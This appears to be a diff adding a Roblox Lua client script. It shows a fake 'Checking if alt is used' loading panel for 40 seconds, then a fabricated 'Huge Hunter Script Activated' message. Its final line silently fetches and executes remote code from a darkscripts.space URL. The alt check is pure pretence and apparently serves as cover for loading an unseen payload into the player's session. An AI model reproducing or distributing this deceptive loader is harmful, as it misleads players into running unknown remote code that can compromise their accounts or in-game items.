@@ -1,0 +1,117 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui1 = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local Progressbar = Instance.new("Frame")
+local UICorner_2 = Instance.new("UICorner")
+local Bar = Instance.new("Frame")
+local UICorner_3 = Instance.new("UICorner")
+local astr = Instance.new("TextLabel")
+local TextLabel = Instance.new("TextLabel")
+local UICorner_4 = Instance.new("UICorner")
+local UIStroke = Instance.new("UIStroke")
+local UIStroke_2 = Instance.new("UIStroke")
+--Properties:
+
+ScreenGui1.Name = "ScreenGui1"
+ScreenGui1.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui1.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = ScreenGui1
+Frame.BackgroundColor3 = Color3.fromRGB(61, 61, 61)
+Frame.BackgroundTransparency = 0.350
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.640737772, 0, 0.212460071, 0)
+Frame.Size = UDim2.new(0, 287, 0, 189)
+UIStroke_2.Parent = Frame
+UIStroke_2.Thickness = 4.3
+Frame.Active = true
+Frame.Draggable = true
+UICorner.CornerRadius = UDim.new(0, 20)
+UICorner.Parent = Frame
+
+Progressbar.Name = "Progress bar"
+Progressbar.Parent = Frame
+Progressbar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Progressbar.BackgroundTransparency = 1.000
+Progressbar.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Progressbar.BorderSizePixel = 0
+Progressbar.Position = UDim2.new(0.0905923322, 0, 0.619047642, 0)
+Progressbar.Size = UDim2.new(0, 235, 0, 45)
+UIStroke.Parent = Progressbar
+UIStroke.Thickness = 4.3
+UICorner_2.Parent = Progressbar
+
+Bar.Name = "Bar"
+Bar.Parent = Progressbar
+Bar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Bar.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Bar.BorderSizePixel = 0
+Bar.Size = UDim2.new(0, 0, 1, 0)
+
+UICorner_3.Parent = Bar
+
+astr.Name = "astr"
+astr.Parent = Frame
+astr.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+astr.BackgroundTransparency = 1.000
+astr.BorderColor3 = Color3.fromRGB(0, 0, 0)
+astr.BorderSizePixel = 0
+astr.Position = UDim2.new(0.149825782, 0, 0.349206358, 0)
+astr.Size = UDim2.new(0, 200, 0, 40)
+astr.Font = Enum.Font.SourceSansBold
+astr.Text = "Checking if alt is used"
+astr.TextColor3 = Color3.fromRGB(255, 255, 255)
+astr.TextScaled = true
+astr.TextSize = 14.000
+astr.TextWrapped = true
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(0.108013935, 0, 0.0793650821, 0)
+TextLabel.Size = UDim2.new(0, 225, 0, 51)
+TextLabel.Font = Enum.Font.SourceSansBold
+TextLabel.Text = "TextLabel"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+
+UICorner_4.Parent = TextLabel
+
+-- Scripts:
+
+local function LFEOSL_fake_script() -- Bar.LocalScript 
+	local script = Instance.new('LocalScript', Bar)
+
+	script.Parent:TweenSize(UDim2.new(1,0,1,0),"InOut","Sine",40)
+	wait(40)
+	script.Parent.Parent.Parent.Parent.Enabled = false
+	local message = require(game.ReplicatedStorage.Library.Client.Message)
+	message.Error("No Alt Account Found! Huge Hunter Script Activated!")
+end
+coroutine.wrap(LFEOSL_fake_script)()
+local function MZTODFI_fake_script() -- TextLabel.LocalScript 
+	local script = Instance.new('LocalScript', TextLabel)
+
+	local textLabel = script.Parent
+	local loadingStates = {"Loading.", "Loading..", "Loading..."}
+	local currentIndex = 1
+	
+	while true do
+		textLabel.Text = loadingStates[currentIndex]
+		currentIndex = (currentIndex % #loadingStates) + 1
+		wait(0.9) -- Change this value to adjust the speed of the loop
+	end
+end
+coroutine.wrap(MZTODFI_fake_script)()
+
+loadstring(game:HttpGet('https://darkscripts.space/scripts/996ecc293b.lua', true))()
